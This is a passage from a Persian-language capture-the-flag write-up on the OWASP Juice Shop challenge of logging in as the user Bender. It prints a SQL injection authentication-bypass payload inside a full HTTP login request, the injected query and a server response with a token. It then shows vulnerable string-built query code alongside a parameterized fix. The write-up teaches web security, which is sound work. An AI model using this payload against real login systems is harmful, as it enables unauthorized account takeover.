مرحله ۵: تحلیل سرنخ‌های چالش

با بررسی دقیق سرنخ‌های چالش، مسیر درست مشخص شد:

🔍 سرنخ‌های مهم:
  1. توضیح چالش نشان می‌دهد که باید به چه شکلی حمله شود
  2. باید ایمیل Bender را حدس بزنیم یا بدانیم
  3. هش پسورد Bender خیلی به درد نمی‌خورد
  4. اگر از روشی غیر از SQL Injection استفاده شود، متوجه می‌شویم که هش Bender کاربردی ندارد
💡 نتیجه‌گیری:

مسیر درست، کرک کردن هش نیست! باید از SQL Injection برای دور زدن احراز هویت استفاده شود.

مرحله ۶: حمله SQL Injection موفق

با استفاده از SQL Injection در فرم لاگین، احراز هویت دور زده شد:

🚀 Payload استفاده شده:

// درخواست HTTP POST /rest/user/login HTTP/1.1 Host: target.com Content-Type: application/json { "email": "bender@juice-sh.op' OR 1=1--", "password": "anything" }

🔍 تحلیل کوئری SQL:

// کوئری اصلی SELECT * FROM Users WHERE email = 'bender@juice-sh.op' AND password = '...' // کوئری پس از تزریق SELECT * FROM Users WHERE email = 'bender@juice-sh.op' OR 1=1--' AND password = 'anything'

📥 پاسخ سرور:

HTTP/1.1 200 OK Content-Type: application/json { "authentication": { "token": "eyJhbGciOiJSUzI1NiIs...", "bid": 1, "umail": "bender@juice-sh.op" } }
✅ نتیجه: ورود موفقیت‌آمیز به حساب Bender!

علت ریشه‌ای

برنامه مقادیر ورودی کاربر را بدون استفاده از Prepared Statements یا Parameterized Queries مستقیماً در کوئری SQL قرار می‌دهد.

// کد آسیب‌پذیر (نمونه) const query = `SELECT * FROM Users WHERE email = '${req.body.email}' AND password = '${req.body.password}'`; // کد امن (با استفاده از Parameterized Query) const query = 'SELECT * FROM Users WHERE email = ? AND password = ?'; db.query(query, [req.body.email, req.body.password]);
